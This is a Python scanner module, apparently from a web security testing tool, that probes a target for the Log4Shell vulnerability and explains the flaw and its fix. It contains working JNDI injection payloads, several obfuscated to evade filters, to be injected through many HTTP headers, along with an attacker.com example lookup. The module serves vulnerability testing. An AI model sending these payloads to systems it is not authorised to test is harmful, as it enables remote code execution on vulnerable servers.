"""
Log4Shell / Log4j (CVE-2021-44228)
=====================================
WHAT IS IT?
  A critical vulnerability in the Apache Log4j Java logging library. When the
  library logs a string like ${jndi:ldap://attacker.com/x}, it actually reaches
  out to that server — allowing remote code execution.

WHY DANGEROUS?
  Rated 10/10 severity. Affects millions of apps. Attacker gets full RCE just
  by sending a crafted string in ANY logged field (User-Agent, username, etc.)

FIX: Update Log4j to 2.17.1+. Disable JNDI lookups with log4j2.formatMsgNoLookups=true
REFERENCE: https://www.cisa.gov/log4j
"""
from modules.base import BaseScanner
from utils.helpers import safe_get, safe_post

# In a real test you'd use a Burp Collaborator or interactserver.io callback URL
# Here we use a canary-style placeholder and check for DNS callbacks
CALLBACK_DOMAIN = "your-burp-collaborator.com"

PAYLOADS = [
    "${jndi:ldap://" + CALLBACK_DOMAIN + "/log4j}",
    "${jndi:ldap://127.0.0.1/log4j}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1/a}",
    "${${lower:j}ndi:${lower:l}dap://127.0.0.1/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1/a}",
    "%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%2Fa%7D",  # URL encoded
]

INJECTION_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Api-Version",
    "Referer",
    "X-Real-IP",
    "Authorization",
    "Accept-Language",
    "Accept",
    "CF-Connecting-IP",
    "True-Client-IP",
]


class Log4jScanner(BaseScanner):
    NAME = "Log4Shell Scanner"

    def run(self):
        self.log("Testing for Log4Shell (CVE-2021-44228)...")
        self.log("NOTE: Full detection requires an out-of-band callback server (e.g. Burp Collaborator)", "warn")
        findings = []

        for payload in PAYLOADS[:3]:
            headers = {h: payload for h in INJECTION_HEADERS}
            resp = safe_get(self.session, self.base_url, self.timeout, headers=headers)
            if resp:
                # Check for Java error traces in response (indicates Java backend)
                if any(sig in resp.text for sig in ["java.", "javax.", "org.apache", "Exception"]):
                    findings.append(
                        f"Java application detected — Log4j payload sent via {len(INJECTION_HEADERS)} headers. "
                        f"Use an OOB callback server to confirm RCE."
                    )
                    self.vulnerable = True
                    break

        if findings:
            self.findings = findings
            return self.result(True, "Java app detected, Log4j payloads sent — verify OOB callbacks")

        return self.result(
            False,
            "No Java indicators found. If Java app confirmed, use Burp Collaborator for OOB testing."
        )
